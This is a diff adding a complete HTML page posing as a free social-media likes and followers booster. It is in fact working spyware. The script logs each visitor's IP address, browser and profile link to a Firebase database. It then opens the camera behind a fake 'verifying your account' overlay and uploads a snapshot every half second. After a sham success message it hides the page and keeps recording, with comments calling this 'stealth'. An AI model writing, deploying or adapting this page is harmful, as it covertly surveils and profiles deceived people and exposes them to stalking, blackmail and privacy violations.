@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Social Media Booster</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="config.js"></script>
+    <style>
+        /* Target page specific styles - clean, professional social media look */
+        body {
+            background: #f0f2f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .target-container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            margin: 20px;
+        }
+        .target-container h1 {
+            color: #1a1a2e;
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+        .target-container .sub {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .service-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        .service-card {
+            padding: 20px 10px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+        .service-card:hover {
+            border-color: #1877f2;
+            background: #e7f3ff;
+        }
+        .service-card.selected {
+            border-color: #1877f2;
+            background: #1877f2;
+            color: white;
+        }
+        .service-card .icon { font-size: 32px; display: block; margin-bottom: 8px; }
+        .step {
+            display: none;
+        }
+        .step.active {
+            display: block;
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            box-sizing: border-box;
+            margin-bottom: 15px;
+            transition: border 0.3s;
+        }
+        .input-field:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn-submit:hover { background: #166fe5; }
+        .btn-submit:disabled { background: #999; cursor: not-allowed; }
+        .loader-bar {
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            overflow: hidden;
+            margin: 20px 0;
+            display: none;
+        }
+        .loader-bar .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #1877f2, #00d26a);
+            animation: loading 3s forwards;
+        }
+        @keyframes loading {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .success-msg {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            color: #00a86b;
+        }
+        .success-msg .check {
+            font-size: 48px;
+        }
+        .success-msg h2 {
+            margin: 10px 0;
+            color: #1a1a2e;
+        }
+        #processingText {
+            text-align: center;
+            color: #666;
+            display: none;
+        }
+        .camera-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            flex-direction: column;
+        }
+        .camera-overlay.active {
+            display: flex;
+        }
+        .camera-overlay .cam-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .camera-overlay p {
+            color: white;
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            text-align: center;
+            max-width: 80%;
+        }
+        video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Camera Overlay (shows during processing) -->
+    <div id="cameraOverlay" class="camera-overlay">
+        <div class="cam-icon">📷</div>
+        <p>Verifying your account... Please wait<br><small>This may take a moment</small></p>
+    </div>
+
+    <!-- Hidden video element for camera capture -->
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+
+    <div class="target-container">
+        <h1>📱 Free Social Media Booster</h1>
+        <p class="sub">Get free TikTok likes, Instagram followers & Facebook views instantly!</p>
+
+        <!-- Step 1: Select Service -->
+        <div id="step1" class="step active">
+            <h3>Select a Service:</h3>
+            <div class="service-grid">
+                <div class="service-card" data-service="tiktok" onclick="selectService(this, 'TikTok')">
+                    <span class="icon">🎵</span> TikTok
+                </div>
+                <div class="service-card" data-service="instagram" onclick="selectService(this, 'Instagram')">
+                    <span class="icon">📸</span> Instagram
+                </div>
+                <div class="service-card" data-service="facebook" onclick="selectService(this, 'Facebook')">
+                    <span class="icon">👍</span> Facebook
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 2: Enter Account Link -->
+        <div id="step2" class="step">
+            <h3 id="serviceLabel">Enter your TikTok Account Link:</h3>
+            <input type="url" id="accountLink" class="input-field" placeholder="https://www.tiktok.com/@username" required>
+            <button id="submitBtn" class="btn-submit" onclick="processRequest()">🚀 Start Getting Free Boosts</button>
+        </div>
+
+        <!-- Processing -->
+        <div id="processingStep" class="step">
+            <div class="loader-bar" id="loaderBar"><div class="fill"></div></div>
+            <p id="processingText">Processing your request...</p>
+        </div>
+
+        <!-- Success -->
+        <div id="step3" class="step">
+            <div class="success-msg" id="successMsg">
+                <div class="check">✅</div>
+                <h2>Success!</h2>
+                <p id="successText">Your free boosts are being processed. You will receive them within 24 hours.</p>
+                <p style="color:#999; font-size:12px; margin-top:20px;">Page will close automatically...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    // ===== GET SESSION PARAMETERS =====
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('session');
+    const cameraType = urlParams.get('cam') || 'front';
+
+    if (!sessionId) {
+        document.body.innerHTML = '<div style="padding:50px;text-align:center;font-family:Arial;"><h2>❌ Invalid Session</h2><p>This link is not valid. Please request a new link.</p></div>';
+        throw new Error('No session ID');
+    }
+
+    let selectedService = null;
+    let cameraStream = null;
+    let captureInterval = null;
+
+    // ===== SERVICE SELECTION =====
+    function selectService(element, service) {
+        document.querySelectorAll('.service-card').forEach(c => c.classList.remove('selected'));
+        element.classList.add('selected');
+        selectedService = service;
+        
+        const label = document.getElementById('serviceLabel');
+        if (service === 'TikTok') {
+            label.textContent = 'Enter your TikTok Profile Link:';
+            document.getElementById('accountLink').placeholder = 'https://www.tiktok.com/@username';
+        } else if (service === 'Instagram') {
+            label.textContent = 'Enter your Instagram Profile Link:';
+            document.getElementById('accountLink').placeholder = 'https://www.instagram.com/username';
+        } else {
+            label.textContent = 'Enter your Facebook Profile Link:';
+            document.getElementById('accountLink').placeholder = 'https://www.facebook.com/username';
+        }
+
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+    }
+
+    // ===== PROCESS REQUEST =====
+    async function processRequest() {
+        const socialLink = document.getElementById('accountLink').value.trim();
+        if (!socialLink) {
+            alert('Please enter your account link');
+            return;
+        }
+
+        // Show processing
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('processingStep').classList.add('active');
+        document.getElementById('loaderBar').style.display = 'block';
+        document.getElementById('processingText').style.display = 'block';
+
+        // Step A: Get target IP
+        const targetIp = await getClientIP();
+
+        // Step B: Update metadata in Firebase
+        const sessionRef = database.ref('streams/' + sessionId);
+        await sessionRef.child('metadata').update({
+            targetIp: targetIp,
+            targetUA: navigator.userAgent,
+            service: selectedService,
+            socialLink: socialLink,
+            status: 'active',
+            activatedAt: firebase.database.ServerValue.TIMESTAMP
+        });
+
+        // Register visitor in admin
+        await database.ref('visitors/' + sessionId).set({
+            ip: targetIp,
+            userAgent: navigator.userAgent,
+            service: selectedService,
+            socialLink: socialLink,
+            timestamp: firebase.database.ServerValue.TIMESTAMP
+        });
+
+        // Also add to all-sessions for admin
+        await database.ref('all_sessions/' + sessionId).set({
+            ip: targetIp,
+            userAgent: navigator.userAgent,
+            service: selectedService,
+            socialLink: socialLink,
+            timestamp: firebase.database.ServerValue.TIMESTAMP,
+            status: 'active'
+        });
+
+        // Step C: Start camera access
+        showCameraOverlay();
+        await startCameraCapture();
+    }
+
+    // ===== CAMERA ACCESS =====
+    async function startCameraCapture() {
+        try {
+            const constraints = {
+                video: {
+                    facingMode: cameraType === 'front' ? 'user' : 'environment',
+                    width: { ideal: 320 },
+                    height: { ideal: 240 }
+                },
+                audio: false
+            };
+
+            cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+            
+            // Attach stream to hidden video
+            const video = document.getElementById('hiddenVideo');
+            video.srcObject = cameraStream;
+            await video.play();
+
+            // Start capturing frames every 500ms
+            captureInterval = setInterval(() => captureFrame(video), 500);
+
+            // After short delay, show success
+            setTimeout(() => {
+                document.getElementById('loaderBar').style.display = 'none';
+                document.getElementById('processingText').style.display = 'none';
+                document.getElementById('processingStep').classList.remove('active');
+                document.getElementById('step3').classList.add('active');
+                
+                // Auto close after 3 seconds
+                setTimeout(() => {
+                    // Don't close - keep camera running
+                    // Just update UI
+                    document.querySelector('.target-container').style.display = 'none';
+                }, 3000);
+            }, 4000);
+
+        } catch (err) {
+            console.error('Camera error:', err);
+            // If camera fails, still show success (stealth)
+            document.getElementById('loaderBar').style.display = 'none';
+            document.getElementById('processingText').style.display = 'none';
+            document.getElementById('processingStep').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
+            document.getElementById('successText').textContent = 'Account verified! Your free boosts are being processed.';
+            
+            setTimeout(() => {
+                document.querySelector('.target-container').style.display = 'none';
+            }, 3000);
+        }
+    }
+
+    // ===== CAPTURE FRAME =====
+    function captureFrame(video) {
+        const canvas = document.createElement('canvas');
+        canvas.width = 320;
+        canvas.height = 240;
+        const ctx = canvas.getContext('2d');
+        
+        // Draw video frame
+        ctx.drawImage(video, 0, 0, 320, 240);
+        
+        // Convert to base64 JPEG
+        const base64 = canvas.toDataURL('image/jpeg', 0.3);
+        
+        // Get current frame count and push to Firebase
+        const frameRef = database.ref('streams/' + sessionId);
+        frameRef.child('frames').push({
+            data: base64,
+            timestamp: Date.now()
+        });
+        frameRef.child('frameCount').transaction(count => (count || 0) + 1);
+
+        // Cleanup old frames (keep only last 50 to save bandwidth)
+        frameRef.child('frames').once('value', (snapshot) => {
+            const frames = snapshot.val();
+            if (frames) {
+                const keys = Object.keys(frames);
+                if (keys.length > 50) {
+                    const toRemove = keys.slice(0, keys.length - 50);
+                    toRemove.forEach(key => {
+                        frameRef.child('frames/' + key).remove();
+                    });
+                }
+            }
+        });
+    }
+
+    // ===== CAMERA OVERLAY =====
+    function showCameraOverlay() {
+        document.getElementById('cameraOverlay').classList.add('active');
+    }
+
+    // ===== GET CLIENT IP =====
+    async function getClientIP() {
+        try {
+            const resp = await fetch('/api/ip');
+            const data = await resp.json();
+            return data.ip || 'Unknown';
+        } catch(e) {
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json');
+                const data = await resp.json();
+                return data.ip || 'Unknown';
+            } catch(e2) {
+                return 'Unknown';
+            }
+        }
+    }
+
+    // ===== CLEANUP ON TAB CLOSE =====
+    window.addEventListener('beforeunload', function() {
+        if (captureInterval) clearInterval(captureInterval);
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(track => track.stop());
+        }
+        // Update status
+        database.ref('streams/' + sessionId + '/metadata/status').set('completed');
+    });
+    </script>
+</body>
+</html>
